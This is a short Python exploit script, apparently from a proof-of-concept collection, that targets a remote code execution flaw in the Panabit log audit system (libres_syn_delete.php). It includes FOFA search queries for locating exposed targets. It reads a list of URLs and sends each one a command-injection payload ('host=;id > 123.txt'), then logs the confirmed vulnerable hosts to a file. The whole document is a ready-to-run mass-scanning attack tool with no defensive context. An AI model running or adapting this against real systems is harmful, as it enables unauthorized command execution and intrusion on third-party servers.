##  name: Panabit_RCE
##  author: Pings
##  severity: critical
##  description: Panabit日志审计系统libres_syn_delete.php文件存在代码执行漏洞

##fofa-query: body="对不起，您的日志系统时间和您的流控系统时间相差超过30分钟，请核对！"
##fofa-query: body="Maintain/cloud_index.php"

import requests
import urllib3

urllib3.disable_warnings()

def exp(url):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'token=10&id=10&host=;id > 123.txt'

    try:
        response = requests.post(url + '/content-apply/libres_syn_delete.php', data=data, headers=headers, verify=False, timeout=30)
        shell_url = url + '/content-apply/123.txt'
        
        if '{"yn":"yes","str":"OK"}' in response.text:
            print(f'[+]存在漏洞: {shell_url}')
            with open('ok.txt', 'a') as ok_file:
                ok_file.write(shell_url + '\n')
    except requests.exceptions.Timeout:
        print(f"[-]目标URL超过30秒无响应: {url}")
    except Exception as e:
        pass

if __name__ == '__main__':
    with open('url.txt', 'r') as url_file:
        for url in url_file:
            target_url = url.strip('\n\r')
            exp(target_url)
